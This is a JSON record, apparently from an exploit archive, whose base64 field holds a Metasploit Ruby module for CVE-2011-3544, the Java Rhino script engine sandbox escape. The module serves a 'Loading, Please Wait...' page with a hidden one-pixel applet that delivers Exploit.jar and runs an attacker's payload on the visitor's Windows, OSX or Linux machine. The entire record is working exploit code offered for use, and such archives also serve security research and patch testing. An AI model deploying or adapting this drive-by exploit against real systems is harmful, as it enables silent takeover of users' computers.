{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyBodHRwOi8vbWV0YXNwbG9pdC5jb20vZnJhbWV3b3JrLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQpyZXF1aXJlICdyZXgnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcjo6SFRNTA0KDQoJZGVmIGluaXRpYWxpemUoIGluZm8gPSB7fSApDQoJCXN1cGVyKCB1cGRhdGVfaW5mbyggaW5mbywNCgkJCSdOYW1lJyAgICAgICAgICA9PiAnSmF2YSBBcHBsZXQgUmhpbm8gU2NyaXB0IEVuZ2luZSBSZW1vdGUgQ29kZSBFeGVjdXRpb24nLA0KCQkJJ0Rlc2NyaXB0aW9uJyAgID0+ICVxew0KCQkJCQlUaGlzIG1vZHVsZSBleHBsb2l0cyBhIHZ1bG5lcmFiaWxpdHkgaW4gdGhlIFJoaW5vIFNjcmlwdCBFbmdpbmUgdGhhdA0KCQkJCWNhbiBiZSB1c2VkIGJ5IGEgSmF2YSBBcHBsZXQgdG8gcnVuIGFyYml0cmFyeSBKYXZhIGNvZGUgb3V0c2lkZSBvZg0KCQkJCXRoZSBzYW5kYm94LiAgVGhlIHZ1bG5lcmFiaWxpdHkgYWZmZWN0cyB2ZXJzaW9uIDcgYW5kIHZlcnNpb24gNiB1cGRhdGUNCgkJCQkyNyBhbmQgZWFybGllciwgYW5kIHNob3VsZCB3b3JrIG9uIGFueSBicm93c2VyIHRoYXQgc3VwcG9ydHMgSmF2YQ0KCQkJCShmb3IgZXhhbXBsZTogSUUsIEZpcmVmb3gsIEdvb2dsZSBDaHJvbWUsIGV0YykNCgkJCX0sDQoJCQknTGljZW5zZScgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQoJCQknQXV0aG9yJyAgICAgICAgPT4NCgkJCQlbDQoJCQkJCSdNaWNoYWVsIFNjaGllcmwnLCAjIERpc2NvdmVyeQ0KCQkJCQknanVhbiB2YXpxdWV6JywgICAgIyBtZXRhc3Bsb2l0IG1vZHVsZQ0KCQkJCQknRWR3YXJkIEQuIFRlYWNoIDx0ZWFjaEBjb25zb3J0aXVtLW9mLXB3bmVycy5uZXQ+JywNCgkJCQkJJ3Npbm4zcicNCgkJCQldLA0KCQkJJ1JlZmVyZW5jZXMnICAgID0+DQoJCQkJWw0KCQkJCQlbICdDVkUnLCAnMjAxMS0zNTQ0JyBdLA0KCQkJCQlbICdPU1ZEQicsICc3NjUwMCcgXSwgIyA3NjUwMCBhbmQgNzY0OTkgaGF2ZSBjb250ZW50cyBtaXhlZA0KCQkJCQlbICdVUkwnLCAnaHR0cDovL3d3dy56ZXJvZGF5aW5pdGlhdGl2ZS5jb20vYWR2aXNvcmllcy9aREktMTEtMzA1LycgXSwNCgkJCQkJWyAnVVJMJywgJ2h0dHA6Ly9zY2hpZXJsbS51c2Vycy5zb3VyY2Vmb3JnZS5uZXQvQ1ZFLTIwMTEtMzU0NC5odG1sJyBdLA0KCQkJCV0sDQoJCQknUGxhdGZvcm0nICAgICAgPT4gWyAnamF2YScsICd3aW4nLCAnbGludXgnIF0sDQoJCQknUGF5bG9hZCcgICAgICAgPT4geyAnU3BhY2UnID0+IDIwNDgwLCAnQmFkQ2hhcnMnID0+ICcnLCAnRGlzYWJsZU5vcHMnID0+IHRydWUgfSwNCgkJCSdUYXJnZXRzJyAgICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnR2VuZXJpYyAoSmF2YSBQYXlsb2FkKScsDQoJCQkJCQl7DQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfSkFWQSwNCgkJCQkJCX0NCgkJCQkJXSwNCgkJCQkJWyAnV2luZG93cyBVbml2ZXJzYWwnLA0KCQkJCQkJew0KCQkJCQkJCSdBcmNoJyA9PiBBUkNIX1g4NiwNCgkJCQkJCQknUGxhdGZvcm0nID0+ICd3aW4nDQoJCQkJCQl9DQoJCQkJCV0sDQoJCQkJCVsgJ0FwcGxlIE9TWCcsDQoJCQkJCQl7DQoJCQkJCQkJJ0FSQ0gnID0+IEFSQ0hfWDg2LA0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ29zeCcNCgkJCQkJCX0NCgkJCQkJXSwNCgkJCQkJWyAnTGludXggeDg2JywNCgkJCQkJCXsNCgkJCQkJCQknQXJjaCcgPT4gQVJDSF9YODYsDQoJCQkJCQkJJ1BsYXRmb3JtJyA9PiAnbGludXgnDQoJCQkJCQl9DQoJCQkJCV0NCgkJCQldLA0KCQkJJ0RlZmF1bHRUYXJnZXQnICA9PiAwLA0KCQkJJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAnT2N0IDE4IDIwMTEnDQoJCQkpKQ0KCWVuZA0KDQoNCglkZWYgb25fcmVxdWVzdF91cmkoIGNsaSwgcmVxdWVzdCApDQoJCWlmIG5vdCByZXF1ZXN0LnVyaS5tYXRjaCgvXC5qYXIkL2kpDQoJCQlpZiBub3QgcmVxdWVzdC51cmkubWF0Y2goL1wvJC8pDQoJCQkJc2VuZF9yZWRpcmVjdChjbGksIGdldF9yZXNvdXJjZSgpICsgJy8nLCAnJykNCgkJCQlyZXR1cm4NCgkJCWVuZA0KDQoJCQlwcmludF9zdGF0dXMoIiN7c2VsZi5uYW1lfSBoYW5kbGluZyByZXF1ZXN0IGZyb20gI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fS4uLiIpDQoNCgkJCXNlbmRfcmVzcG9uc2VfaHRtbCggY2xpLCBnZW5lcmF0ZV9odG1sLCB7ICdDb250ZW50LVR5cGUnID0+ICd0ZXh0L2h0bWwnIH0gKQ0KCQkJcmV0dXJuDQoJCWVuZA0KDQoJCXBhdGhzID0gWw0KCQkJWyAiRXhwbG9pdC5jbGFzcyIgXQ0KCQldDQoNCgkJcCA9IHJlZ2VuZXJhdGVfcGF5bG9hZChjbGkpDQoNCgkJamFyICA9IHAuZW5jb2RlZF9qYXINCgkJcGF0aHMuZWFjaCBkbyB8cGF0aHwNCgkJCTEudXB0byhwYXRoLmxlbmd0aCAtIDEpIGRvIHxpZHh8DQoJCQkJZnVsbCA9IHBhdGhbMCxpZHhdLmpvaW4oIi8iKSArICIvIg0KCQkJCWlmICEoamFyLmVudHJpZXMubWFwe3xlfGUubmFtZX0uaW5jbHVkZT8oZnVsbCkpDQoJCQkJCWphci5hZGRfZmlsZShmdWxsLCAnJykNCgkJCQllbmQNCgkJCWVuZA0KCQkJZmQgPSBGaWxlLm9wZW4oRmlsZS5qb2luKCBNc2Y6OkNvbmZpZy5pbnN0YWxsX3Jvb3QsICJkYXRhIiwgImV4cGxvaXRzIiwgImN2ZS0yMDExLTM1NDQiLCBwYXRoICksICJyYiIpDQoJCQlkYXRhID0gZmQucmVhZChmZC5zdGF0LnNpemUpDQoJCQlqYXIuYWRkX2ZpbGUocGF0aC5qb2luKCIvIiksIGRhdGEpDQoJCQlmZC5jbG9zZQ0KCQllbmQNCg0KCQlwcmludF9zdGF0dXMoICJTZW5kaW5nIEFwcGxldC5qYXIgdG8gI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fS4uLiIgKQ0KCQlzZW5kX3Jlc3BvbnNlKCBjbGksIGphci5wYWNrLCB7ICdDb250ZW50LVR5cGUnID0+ICJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iIH0gKQ0KDQoJCWhhbmRsZXIoIGNsaSApDQoJZW5kDQoNCglkZWYgZ2VuZXJhdGVfaHRtbA0KCQlodG1sICA9ICI8aHRtbD48aGVhZD48dGl0bGU+TG9hZGluZywgUGxlYXNlIFdhaXQuLi48L3RpdGxlPjwvaGVhZD4iDQoJCWh0bWwgKz0gIjxib2R5PjxjZW50ZXI+PHA+TG9hZGluZywgUGxlYXNlIFdhaXQuLi48L3A+PC9jZW50ZXI+Ig0KCQlodG1sICs9ICI8YXBwbGV0IGFyY2hpdmU9XCJFeHBsb2l0LmphclwiIGNvZGU9XCJFeHBsb2l0LmNsYXNzXCIgd2lkdGg9XCIxXCIgaGVpZ2h0PVwiMVwiPiINCgkJaHRtbCArPSAiPC9hcHBsZXQ+PC9ib2R5PjwvaHRtbD4iDQoJCXJldHVybiBodG1sDQoJZW5kDQoNCmVuZA==", 
    "filename": "platforms/multiple/remote/18171.rb", 
    "id": "18171", 
    "cves": [
        "CVE-2011-3544"
    ]
}